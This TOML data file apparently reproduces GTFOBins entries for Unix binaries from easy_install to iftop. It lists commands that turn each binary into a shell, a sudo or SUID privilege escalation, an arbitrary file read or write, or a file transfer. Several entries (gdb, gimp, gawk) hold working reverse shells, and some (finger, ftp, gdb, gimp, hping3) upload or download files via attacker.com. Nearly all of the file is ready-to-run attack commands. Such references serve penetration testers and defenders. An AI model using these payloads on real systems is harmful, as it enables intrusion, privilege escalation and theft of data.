      exp = "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo easy_install $TF\n"
[[privilege-esclation]]
  Name = "eb"
  Description = "This invokes the default logging service, which is likely to be [`journalctl`](/gtfobins/journalctl/), other functions may apply. For this to work the target must be connected to AWS instance via EB-CLI."
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "eb logs\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo eb logs\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "ed"
  Description = ""
  Tags = ["shell", "file-write", "file-read", "suid", "sudo", "limited-suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "ed file_to_read\n,p\nq\n"
    [[privilege-esclation.exps.file-write]]
      exp = "ed file_to_write\na\nDATA\n.\nw\nq\n"
    [[privilege-esclation.exps.limited-suid]]
      exp = "./ed\n!/bin/sh\n"
    [[privilege-esclation.exps.shell]]
      exp = "ed\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo ed\n!/bin/sh\n"
    [[privilege-esclation.exps.suid]]
      exp = "./ed file_to_read\n,p\nq\n"
[[privilege-esclation]]
  Name = "efax"
  Description = "The content is actually parsed by the command, thus it may not be suitable for reading arbitrary files."
  Tags = ["suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo efax -d \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./efax -d \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "elvish"
  Description = ""
  Tags = ["sudo", "file-read", "file-write", "shell", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "export LFILE=file_to_read\nelvish -c 'echo (slurp <$E:LFILE)'\n"
    [[privilege-esclation.exps.file-write]]
      exp = "export LFILE=file_to_write\nelvish -c 'echo DATA >$E:LFILE'\n"
    [[privilege-esclation.exps.shell]]
      exp = "elvish"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo elvish"
    [[privilege-esclation.exps.suid]]
      exp = "./elvish"
[[privilege-esclation]]
  Name = "emacs"
  Description = ""
  Tags = ["shell", "file-write", "file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "emacs file_to_read"
    [[privilege-esclation.exps.file-write]]
      exp = "emacs file_to_write\nDATA\nC-x C-s\n"
    [[privilege-esclation.exps.shell]]
      exp = "emacs -Q -nw --eval '(term \"/bin/sh\")'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"
    [[privilege-esclation.exps.suid]]
      exp = "./emacs -Q -nw --eval '(term \"/bin/sh -p\")'"
[[privilege-esclation]]
  Name = "env"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "env /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo env /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./env /bin/sh -p"
[[privilege-esclation]]
  Name = "eqn"
  Description = "The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\neqn \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo eqn \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./eqn \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "espeak"
  Description = "The file content appears in the middle of other textual information, thus it might not be suitable to read arbitray binary files."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nespeak -qXf \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo espeak -qXf \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./espeak -qXf \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "ex"
  Description = ""
  Tags = ["shell", "file-write", "file-read", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "ex file_to_read\n,p\nq\n"
    [[privilege-esclation.exps.file-write]]
      exp = "ex file_to_write\na\nDATA\n.\nw\nq\n"
    [[privilege-esclation.exps.shell]]
      exp = "ex\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo ex\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "exiftool"
  Description = "If the permissions allow it, files are moved (instead of copied) to the destination.\n"
  Tags = ["file-read", "file-write", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nOUTPUT=output_file\nexiftool -filename=$OUTPUT $LFILE\ncat $OUTPUT\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nINPUT=input_file\nexiftool -filename=$LFILE $INPUT\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT\n"
[[privilege-esclation]]
  Name = "expand"
  Description = "The read file content is corrupted by replacing tabs with spaces."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nexpand \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo expand \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./expand \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "expect"
  Description = ""
  Tags = ["file-read", "shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nexpect $LFILE\n"
    [[privilege-esclation.exps.shell]]
      exp = "expect -c 'spawn /bin/sh;interact'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo expect -c 'spawn /bin/sh;interact'"
    [[privilege-esclation.exps.suid]]
      exp = "./expect -c 'spawn /bin/sh -p;interact'"
[[privilege-esclation]]
  Name = "facter"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nFACTERLIB=$TF facter\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo FACTERLIB=$TF facter\n"
[[privilege-esclation]]
  Name = "file"
  Description = ""
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nfile -f $LFILE\n"
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nfile -m $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo file -f $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./file -f $LFILE\n"
[[privilege-esclation]]
  Name = "find"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "find . -exec /bin/sh \\; -quit"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo find . -exec /bin/sh \\; -quit"
    [[privilege-esclation.exps.suid]]
      exp = "./find . -exec /bin/sh -p \\; -quit"
[[privilege-esclation]]
  Name = "finger"
  Description = "`finger` hangs waiting for the remote peer to close the socket.\n"
  Tags = ["file-upload", "file-download"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "RHOST=attacker.com\nLFILE=file_to_save\nfinger x@$RHOST | base64 -d > \"$LFILE\"\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "RHOST=attacker.com\nLFILE=file_to_send\nfinger \"$(base64 $LFILE)@$RHOST\"\n"
[[privilege-esclation]]
  Name = "fish"
  Description = ""
  Tags = ["sudo", "shell", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "fish"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo fish"
    [[privilege-esclation.exps.suid]]
      exp = "./fish"
[[privilege-esclation]]
  Name = "flock"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "flock -u / /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo flock -u / /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./flock -u / /bin/sh -p"
[[privilege-esclation]]
  Name = "fmt"
  Description = "The read file content is not binary-safe."
  Tags = ["sudo", "file-read", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nfmt -pNON_EXISTING_PREFIX \"$LFILE\"\n"
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nfmt -999 \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo fmt -999 \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./fmt -999 \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "fold"
  Description = ""
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nfold -w99999999 \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo fold -w99999999 \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./fold -w99999999 \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "fping"
  Description = ""
  Tags = ["file-read", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nfping -f $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo fping -f $LFILE\n"
[[privilege-esclation]]
  Name = "ftp"
  Description = ""
  Tags = ["file-upload", "file-download", "sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "RHOST=attacker.com\nftp $RHOST\nget file_to_get\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "RHOST=attacker.com\nftp $RHOST\nput file_to_send\n"
    [[privilege-esclation.exps.shell]]
      exp = "ftp\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo ftp\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "gawk"
  Description = ""
  Tags = ["file-read", "suid", "sudo", "limited-suid", "shell", "non-interactive-reverse-shell", "non-interactive-bind-shell", "file-write"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ngawk '//' \"$LFILE\"\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\ngawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n"
    [[privilege-esclation.exps.limited-suid]]
      exp = "./gawk 'BEGIN {system(\"/bin/sh\")}'"
    [[privilege-esclation.exps.non-interactive-bind-shell]]
      exp = "LPORT=12345\ngawk -v LPORT=$LPORT 'BEGIN {\n    s = \"/inet/tcp/\" LPORT \"/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n"
    [[privilege-esclation.exps.non-interactive-reverse-shell]]
      exp = "RHOST=attacker.com\nRPORT=12345\ngawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n"
    [[privilege-esclation.exps.shell]]
      exp = "gawk 'BEGIN {system(\"/bin/sh\")}'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo gawk 'BEGIN {system(\"/bin/sh\")}'"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./gawk '//' \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "gcc"
  Description = ""
  Tags = ["shell", "sudo", "file-read", "file-write"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ngcc -x c -E \"$LFILE\"\n"
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ngcc @\"$LFILE\"\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_delete\ngcc -xc /dev/null -o $LFILE\n"
    [[privilege-esclation.exps.shell]]
      exp = "gcc -wrapper /bin/sh,-s ."
    [[privilege-esclation.exps.sudo]]
      exp = "sudo gcc -wrapper /bin/sh,-s ."
[[privilege-esclation]]
  Name = "gcloud"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "gcloud help\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo gcloud help\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "gcore"
  Description = "It can be used to generate core dumps of running processes. Such files often contains sensitive information such as open files content, cryptographic keys, passwords, etc. This command produces a binary file named `core.$PID`, that is then often filtered with `strings` to narrow down relevant information."
  Tags = ["file-read", "sudo", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "gcore $PID"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo gcore $PID"
    [[privilege-esclation.exps.suid]]
      exp = "./gcore $PID"
[[privilege-esclation]]
  Name = "gdb"
  Description = ""
  Tags = ["shell", "reverse-shell", "file-read", "sudo", "capabilities", "file-upload", "file-download", "file-write", "library-load", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.capabilities]]
      exp = "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"
    [[privilege-esclation.exps.file-download]]
      exp = "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])' -ex quit\n"
    [[privilege-esclation.exps.file-read]]
      exp = "gdb -nx -ex 'python print(open(\"file_to_read\").read())' -ex quit"
    [[privilege-esclation.exps.file-upload]]
      exp = "export URL=http://attacker.com/\nexport LFILE=file_to_send\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' -ex quit\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "export LPORT=8888\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\ngdb -nx -ex \"dump value $LFILE \\\"DATA\\\"\" -ex quit\n"
    [[privilege-esclation.exps.library-load]]
      exp = "gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' -ex quit"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\ngdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' -ex quit\n"
    [[privilege-esclation.exps.shell]]
      exp = "gdb -nx -ex '!sh' -ex quit"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo gdb -nx -ex '!sh' -ex quit"
    [[privilege-esclation.exps.suid]]
      exp = "./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit"
[[privilege-esclation]]
  Name = "gem"
  Description = ""
  Tags = ["sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "gem open -e \"/bin/sh -c /bin/sh\" rdoc"
    [[privilege-esclation.exps.shell]]
      exp = "gem open rdoc\n:!/bin/sh\n"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/x\ngem build $TF/x\n"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/x\ngem install --file $TF/x\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc"
[[privilege-esclation]]
  Name = "genie"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "genie -c '/bin/sh'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo genie -c '/bin/sh'"
    [[privilege-esclation.exps.suid]]
      exp = "./genie -c '/bin/sh'"
[[privilege-esclation]]
  Name = "genisoimage"
  Description = "The output is placed inside the ISO9660 file system binary format thus it may not be suitable for binary content as is, yet it can be mounted or extracted with tools like `7z`."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ngenisoimage -q -o - \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo genisoimage -q -o - \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./genisoimage -sort \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "ghc"
  Description = ""
  Tags = ["sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "ghc -e 'System.Process.callCommand \"/bin/sh\"'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo ghc -e 'System.Process.callCommand \"/bin/sh\"'"
[[privilege-esclation]]
  Name = "ghci"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "ghci\nSystem.Process.callCommand \"/bin/sh\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo ghci\nSystem.Process.callCommand \"/bin/sh\"\n"
[[privilege-esclation]]
  Name = "gimp"
  Description = "The binary hangs after executing the Python code and can be terminated pressing ``ctrl-c``."
  Tags = ["suid", "sudo", "shell", "reverse-shell", "file-download", "library-load", "file-upload", "file-write", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])'\n"
    [[privilege-esclation.exps.file-read]]
      exp = "gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(\"file_to_read\").read())'"
    [[privilege-esclation.exps.file-upload]]
      exp = "export URL=http://attacker.com/\nexport LFILE=file_to_send\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))'\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "export LPORT=8888\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()'\n"
    [[privilege-esclation.exps.file-write]]
      exp = "gimp -idf --batch-interpreter=python-fu-eval -b 'open(\"file_to_write\", \"wb\").write(\"DATA\")'\n"
    [[privilege-esclation.exps.library-load]]
      exp = "gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'\n"
    [[privilege-esclation.exps.shell]]
      exp = "gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"
    [[privilege-esclation.exps.suid]]
      exp = "./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
[[privilege-esclation]]
  Name = "ginsh"
  Description = ""
  Tags = ["shell", "limited-suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "./ginsh\n!/bin/sh\n"
    [[privilege-esclation.exps.shell]]
      exp = "ginsh\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo ginsh\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "git"
  Description = ""
  Tags = ["file-read", "sudo", "limited-suid", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ngit diff /dev/null $LFILE\n"
    [[privilege-esclation.exps.limited-suid]]
      exp = "PAGER='sh -c \"exec sh 0<&1\"' ./git -p help"
    [[privilege-esclation.exps.shell]]
      exp = "PAGER='sh -c \"exec sh 0<&1\"' git -p help"
    [[privilege-esclation.exps.shell]]
      exp = "git help config\n!/bin/sh\n"
    [[privilege-esclation.exps.shell]]
      exp = "git branch --help config\n!/bin/sh\n"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\ngit -C \"$TF\" commit --allow-empty -m x\n"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\ngit \"--exec-path=$TF\" x\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo git -p help config\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo git branch --help config\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\nsudo git -C \"$TF\" commit --allow-empty -m x\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\nsudo git \"--exec-path=$TF\" x\n"
[[privilege-esclation]]
  Name = "grc"
  Description = ""
  Tags = ["sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "grc --pty /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo grc --pty /bin/sh"
[[privilege-esclation]]
  Name = "grep"
  Description = "There are many `grep` flavors that in many cases are just copies, symlinks or wrappers around the original binary that may share the same behavior, for example: `egrep`, `fgrep`, `zgrep`, etc.\n"
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ngrep '' $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo grep '' $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./grep '' $LFILE\n"
[[privilege-esclation]]
  Name = "gtester"
  Description = ""
  Tags = ["file-write", "shell", "sudo", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\ngtester \"DATA\" -o $LFILE\n"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\ngtester -q $TF\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"
    [[privilege-esclation.exps.suid]]
      exp = "TF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"
[[privilege-esclation]]
  Name = "gzip"
  Description = "There are also a number of other utilities that rely on `gzip` under the hood, e.g., `zless`, `zcat`, `gunzip`, etc. Besides having similar features, they also allow privileged reads if `gzip` itself is SUID."
  Tags = ["suid", "sudo", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ngzip -f $LFILE -t\n"
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ngzip -c $LFILE | gzip -d\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo gzip -f $LFILE -t\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./gzip -f $LFILE -t\n"
[[privilege-esclation]]
  Name = "hd"
  Description = "The output is actually an hex dump."
  Tags = ["suid", "sudo", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nhd \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo hd \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./hd \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "head"
  Description = ""
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nhead -c1G \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo head -c1G \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./head -c1G \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "hexdump"
  Description = "The output is actually an hex dump."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nhexdump -C \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo hexdump -C \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./hexdump -C \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "highlight"
  Description = ""
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nhighlight --no-doc --failsafe \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo highlight --no-doc --failsafe \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./highlight --no-doc --failsafe \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "hping3"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "hping3\n/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo hping3\n/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "RHOST=attacker.com\nLFILE=file_to_read\nsudo hping3 \"$RHOST\" --icmp --data 500 --sign xxx --file \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "./hping3\n/bin/sh -p\n"
[[privilege-esclation]]
  Name = "iconv"
  Description = "The `8859_1` encoding is used as it accepts any single-byte sequence, thus it allows to read/write arbitrary files. Other encoding combinations may corrupt the result."
  Tags = ["file-write", "file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\niconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\necho \"DATA\" | iconv -f 8859_1 -t 8859_1 -o \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "iftop"
  Description = "This requires `iftop` 0.17 and the privilege to capture on some device (specify with `-i` if needed) ."
  Tags = ["sudo", "shell", "limited-suid"]
